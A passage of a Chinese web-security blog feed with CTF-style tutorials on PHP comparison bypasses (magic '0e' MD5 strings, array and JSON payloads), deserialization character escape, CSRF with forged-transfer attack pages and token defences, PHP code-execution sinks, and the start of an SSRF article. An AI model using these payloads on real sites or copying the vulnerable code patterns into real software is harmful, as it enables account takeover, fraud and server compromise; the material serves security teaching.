           <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"Wrong password.."</span><span class="token punctuation">;</span>       
       <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>上述代码中要求我们post一个password值，要与给定的password变量的值相等，但我们不知道password变量的值是什么！这怎么办呢？<br>stamp期望传入的值是字符串类型，但如果我们传入数组类型会怎么样呢？<br>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>
<h2 id="0x04：md5绕过-Hash比较缺陷"><a href="#0x04：md5绕过-Hash比较缺陷" class="headerlink" title="0x04：md5绕过(Hash比较缺陷)"></a>0x04：md5绕过(Hash比较缺陷)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'Username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token variable">$Username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'Username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"successful"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"login failed!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token delimiter">?></span>    </code></pre>
<p>题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p>
<p>介绍一批md5开头是0e的字符串 上文提到过，<strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</strong>。**md5(‘240610708’) == md5(‘QNKCDZO’)**成功绕过!</p>
<pre><code>QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514</code></pre>
<h2 id="0x05：json绕过"><a href="#0x05：json绕过" class="headerlink" title="0x05：json绕过"></a>0x05：json绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span><span class="token string">"*********"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">else</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token string">"~~~~"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0==”admin”这种形式绕过</strong></p>
<p><strong>最终payload message={“key”:0}</strong></p>
<h2 id="0x06：switch绕过"><a href="#0x06：switch绕过" class="headerlink" title="0x06：switch绕过"></a>0x06：switch绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"4admin"</span><span class="token punctuation">;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"fail1"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"fail2"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
       <span class="token keyword">echo</span> <span class="token string">"fail3"</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"sucess"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//结果输出success;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"failall"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>参考：<a href="https://www.cnblogs.com/liangshian/p/10925792.html">https://www.cnblogs.com/liangshian/p/10925792.html</a></p>
<p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:PHP反序列化字符逃逸</title>
    <url>/2021/07/08/web-php-fan-xu-lie-hua-zi-fu-tao-yi/</url>
    <content><![CDATA[<p>写的很好就转载了:<a href="https://www.cnblogs.com/Sumarua/">https://www.cnblogs.com/Sumarua/</a></p>
<p>这段时间遇到几个关于反序列化的字符逃逸的程序，今天来分享一下经验。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'bb'</span><span class="token punctuation">,</span> <span class="token string">'ccc'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$pass</span><span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$AA</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<p>以上面代码为例，如何在不直接修改$pass值的情况下间接修改$pass的值。</p>
<p>代码的流程为：</p>
<p>先序列化代码，然后将里面不希望出现的字符替换成自定义的字符串。然后进行反序列化，最后输出pass变量。</p>
<p>要解决上面这个问题，先来看一下php序列化代码的特征。</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqFpH1.png" alt="1"></p>
<p>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。</p>
<p>如果指定的长度错误则反序列化就会失败。</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqFeud.png" alt="2"></p>
<p>此时的name所读取的数据为aaaa”而正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</p>
<p>把精力回到开头所说的代码，根据刚才讲的，如果我们将name变量中添加bb则程序会报错。</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqF1C8.png" alt="3"><br> 查看过滤前后的代码能发现，应该是6位长度的name变量在过滤后变成了7位，根据反序列化读取变量的原则来讲，此时的name能读取到的是aaaacc，末尾处的那个c是读取不到的，这就形成了一个字符串的逃逸。当我们添加多个bb，每添加一个bb我们就能逃逸一个字符，那我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqFtDs.png" alt="4"></p>
<p>填充如上图数量的bb即可修改pass的值。</p>
<p>具体分析如下：<br> <img src="https://s1.ax1x.com/2020/05/21/YqklZR.png" alt="5"></p>
<p>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。<br> <img src="https://s1.ax1x.com/2020/05/21/YqktzD.png" alt="6"></p>
<p> 转载<a href="https://www.cnblogs.com/Sumarua/">https://www.cnblogs.com/Sumarua/</a></p>
]]></content>
      <tags>
        <tag>反序列化字符逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:csrf漏洞</title>
    <url>/2021/05/27/web-csrf-lou-dong/</url>
    <content><![CDATA[<p><strong>一.CSRF是什么？</strong></p>
<p>　　CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p><strong>二.CSRF可以做什么？</strong></p>
<p>　　你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
<p><strong>三.CSRF漏洞现状</strong></p>
<p>　　CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</p>
<p><strong>四.CSRF的原理</strong></p>
<p>　　下图简单阐述了CSRF攻击的思想：</p>
<p>　　<img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
<p>　　从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
<p>　　1.登录受信任网站A，并在本地生成Cookie。</p>
<p>　　2.在不登出A的情况下，访问危险网站B。</p>
<p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p>
<p>　　1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p>
<p>　　2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……）</p>
<p>　　3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p>
<p>　　上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;）</p>
<p>　　<strong>示例1：</strong></p>
<p>　　银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p>
<p>　　危险网站B，它里面有一段HTML的代码如下：</p>
<p>　　&lt;img&nbsp;src=<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000>">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</a></p>
<p>　　首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……</p>
<p>　　为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000%E2%80%9D%EF%BC%8C%E7%BB%93%E6%9E%9C%E9%93%B6%E8%A1%8C%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E5%88%B0%E8%AF%B7%E6%B1%82%E5%90%8E%EF%BC%8C%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9B%B4%E6%96%B0%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C%EF%BC%88%E8%BD%AC%E8%B4%A6%E6%93%8D%E4%BD%9C%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E7%AB%8B%E5%88%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E8%B4%A6%E6%93%8D%E4%BD%9C">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作</a>……</p>
<p>　　<strong>示例2：</strong></p>
<p>　　为了杜绝上面的问题，银行决定改用POST请求完成转账操作。</p>
<p>　　银行网站A的WEB表单如下：　　</p>
<p>　　<form action="transfer.php" method="post">　　　　</form action="transfer.php" method="post"></p><p>ToBankId:&nbsp;<input type="text" name="tobankid" ></input type="text" name="tobankid" ></p>　　　　<p>Money:&nbsp;<input type="text" name="money" ></input type="text" name="money" ></p>　　　　<p><input type="submit" value="transfer" ></input type="submit" value="transfer" ></p>　　<p></p>
<p>　　后台处理页面Transfer.php如下：</p>
<pre><code>&lt;?php
　　　　session_start();
　　　　if (isset($_REQUEST['toBankId'] &amp;&amp;　isset($_REQUEST['money']))
　　　　{
　　　　  buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
　　　　}
　　?&gt;</code></pre>
<p>　　危险网站B，仍然只是包含那句HTML代码：</p>
<pre><code>　&lt;img&nbsp;src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></pre>
<p>　　和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…..和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
<p>　　<strong>示例3：</strong></p>
<p>　　经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p>
<pre><code>　　&lt;?php
　　　　session_start();
　　　　if (isset($_POST['toBankId'] &amp;&amp;　isset($_POST['money']))
　　　　{
　　　　  buy_stocks($_POST['toBankId'],　$_POST['money']);
　　　　}
　　?&gt;</code></pre>
<p>　　然而，危险网站B与时俱进，它改了一下代码：</p>
<pre><code>&lt;html&gt;
　　&lt;head&gt;
&lt;script type="text/javascript"&gt;
　　　　　　function steal()
　　　　　　{
     　　　　 iframe = document.frames["steal"];
　　   　   iframe.document.Submit("transfer");
　　　　　　}
　　　　&lt;/script&gt;
　　&lt;/head&gt;

　　&lt;body onload="steal()"&gt;
　　　　&lt;iframe name="steal" display="none"&gt;
　　　　　　&lt;form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php"&gt;
　　　　　　　　&lt;input type="hidden" name="toBankId" value="11"&gt;
　　　　　　　　&lt;input type="hidden" name="money" value="1000"&gt;
　　　　　　&lt;/form&gt;
　　　　&lt;/iframe&gt;
　　&lt;/body&gt;
　　&lt;/html&gt;</code></pre>
<p>如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块……因为这里危险网站B暗地里发送了POST请求到银行!</p>
<p>　　总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个<img>就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p>
<p>　　理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
<p><strong>五.CSRF的防御</strong></p>
<p>　　我总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p>
<p>　　<strong>1.服务端进行CSRF防御</strong></p>
<p>　　服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p>
<p>　　(1).Cookie Hashing(所有表单都包含同一个伪随机值)：</p>
<p>　　这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:&gt;</p>
<p>　　<!--?php
　　　　//构造加密的Cookie信息
　　　　$value = “DefenseSCRF”;
　　　　setcookie(”cookie”, $value, time()+3600);
　　?--></p>
<p>　　在表单里增加Hash值，以认证这确实是用户发送的请求。</p>
<pre><code>　&lt;?php
　　　　$hash = md5($_COOKIE['cookie']);
　　?&gt;
　　&lt;form method="POST" action="transfer.php"&gt;
　　　　&lt;input type="text" name="toBankId"&gt;
　　　　&lt;input type="text" name="money"&gt;
　　　　&lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt;
　　　　&lt;input type="submit" name="submit" value="Submit"&gt;
　　&lt;/form&gt;</code></pre>
<p>　　然后在服务器端进行Hash值验证</p>
<pre><code>  &lt;?php
　　   if(isset($_POST['check'])) {
   　   $hash = md5($_COOKIE['cookie']);
     　　 if($_POST['check'] == $hash) {
        　 doJob();
　　      } else {
　　　　　　　　//...
     　　 }
　　   } else {
　　　　　　//...
　　   }
   ?&gt;</code></pre>
<p>　　这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢….由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。<br>　　(2).验证码</p>
<p>　　这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄….这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。</p>
<p>　　(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)</p>
<p>　　在实现One-Time  Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。</p>
<p>　　以下我的实现:</p>
<p>　　1).先是令牌生成函数(gen_token())：</p>
<pre><code> &lt;?php
   function gen_token() {
 　　　　//这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。
　　　　//这个可以参考我写的Findbugs笔记中的[《Random object created and used only once》](https://www.cnblogs.com/hyddd/articles/1391737.html)
     $token = md5(uniqid(rand(), true));
     return $token;
   }</code></pre>
<p>　　2).然后是Session令牌生成函数(gen_stoken())：</p>
<pre><code>   &lt;?php
   　function gen_stoken() {
$pToken = "";
　　　　　　if($_SESSION[STOKEN_NAME] == $pToken){
　　　　　　　　//没有值，赋新值
　　　　　　　　$_SESSION[STOKEN_NAME] = gen_token();
　　　　　　}  
　　　　　　else{
　　　　　　　　//继续使用旧的值
　　　　　　}
   　}
   ?&gt;</code></pre>
<p>　　3).WEB表单生成隐藏输入域的函数：　　</p>
<pre><code>&lt;?php
　　   function gen_input() {
   　   gen_stoken();
　　     echo “&lt;input type=\”hidden\” name=\”" . FTOKEN_NAME . “\”
     　　   value=\”" . $_SESSION[STOKEN_NAME] . “\”&gt; “;
   　　}
   ?&gt;</code></pre>
<p>　　4).WEB表单结构：</p>
<pre><code>&lt;?php
     session_start();
     include(”functions.php”);
   ?&gt;
   &lt;form method="POST" action="transfer.php"&gt;
     &lt;input type="text" name="toBankId"&gt;
     &lt;input type="text" name="money"&gt;
     &lt;? gen_input(); ?&gt;
     &lt;input type="submit" name="submit" value="Submit"&gt;
   &lt;/FORM&gt;</code></pre>
<p>　　5).服务端核对令牌：</p>
<p>　　这个很简单，这里就不再啰嗦了。</p>
<p>　　上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。</p>
<p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:代码执行漏洞</title>
    <url>/2021/05/22/web-dai-ma-zhi-xing-lou-dong/</url>
    <content><![CDATA[<h2 id="简述代码执行漏洞："><a href="#简述代码执行漏洞：" class="headerlink" title="简述代码执行漏洞："></a>简述代码执行漏洞：</h2><p>PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去执行。该漏洞主要存在于eval()、assert()、preg_replace()、call_user_func()、array_map()以及动态函数中。</p>
<h4 id="1-eval和assert函数"><a href="#1-eval和assert函数" class="headerlink" title="1.eval和assert函数"></a>1.eval和assert函数</h4><p> eval()函数是将输入的字符串当做PHP代码执行，assert()会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</p>
<h5 id="示例代码1："><a href="#示例代码1：" class="headerlink" title="示例代码1："></a>示例代码1：</h5><pre><code>&lt;?php
$a='wjw';
$b='xy';
eval('$a=$b;');/assert('$a=$b;');
var_dump($a);
?&gt;</code></pre>
<p><strong>示例代码2：</strong></p>
<pre><code>&lt;?php
eval('phpinfo();');/assert('phpinfo();');
?&gt;</code></pre>
<h4 id="2-preg-replace函数"><a href="#2-preg-replace函数" class="headerlink" title="2.preg_replace函数"></a>2.preg_replace函数</h4><p>此函数的作用是对一个字符串进行正则处理（具体函数功能自行搜索）</p>
<pre><code>mixed preg_replace ( mixed $ pattern , mixed $ replacement , mixed $ subject [, int $ limit = -1 [, int &amp;$ count ]] )</code></pre>
<p>preg_replace函数的代码执行需要存在/e参数</p>
<h5 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h5><pre><code>&lt;?php
preg_replace("/ \[(.*)\]/e",'\\1',$_GET['str']);
?&gt;</code></pre>
<p>将显示PHP版本信息</p>
<h3 id="3-调用函数过滤不严"><a href="#3-调用函数过滤不严" class="headerlink" title="3.调用函数过滤不严"></a>3.调用函数过滤不严</h3><p>call_user_func()和array_map()等函数具有调用其他函数的功能，用call_user_func()函数来举例，函数的作用是调用第一个参数(函数)，将第二个参数作为要调用的函数的参数</p>
<pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )</code></pre>
<p> <strong>测试代码</strong></p>
<pre><code>&lt;?php
$b="phpinfo()";
call_user_func($_GET['a'],$b);
?&gt;</code></pre>
<h2 id="4-动态函数执行"><a href="#4-动态函数执行" class="headerlink" title="4.动态函数执行"></a>4.动态函数执行</h2><p>动态函数的写法为”变量(参数)”</p>
<h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码:"></a>示例代码:</h5><pre><code>&lt;?php
$_GET['a']($_GET['b']);
?&gt;
123</code></pre>
<p>GET请求参数a，作为函数，而b作为函数的参数，执行结果也是php的版本信息</p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:ssrf漏洞</title>
    <url>/2021/05/28/web-ssrf-lou-dong/</url>
    <content><![CDATA[<h5 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h5><pre><code>SSRF漏洞的危害
SSRF漏洞的挖掘
SSRF漏洞的防御
SSRF漏洞原理概述</code></pre>
<h5 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h5><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p>大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。<br><img src="https://img-blog.csdnimg.cn/20190704194808189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="SSRF可以做什么"><a href="#SSRF可以做什么" class="headerlink" title="SSRF可以做什么"></a>SSRF可以做什么</h5><pre><code>可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。
攻击运行在内网或者本地的应用程序。
对内网web应用进行指纹识别，通过访问默认文件实现 。
攻击内外网的web应用。sql注入、struct2、redis等。
利用file协议读取本地文件等。</code></pre>
<h5 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h5><p>一. WEB功能上查找<br>由原理可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，因此我们大可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。</p>
<p>1.通过URL地址分享网页内容早期应用中 ，为了更好的用户体验，Web应用在分享功能中，通常会获取目标URL地址网页内容中标签或者&lt;meta name=“description”content=“”/&gt;标签中content的文本内容提供更好的用户体验。</p>
<p><img src="https://img-blog.csdnimg.cn/20190704195033842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
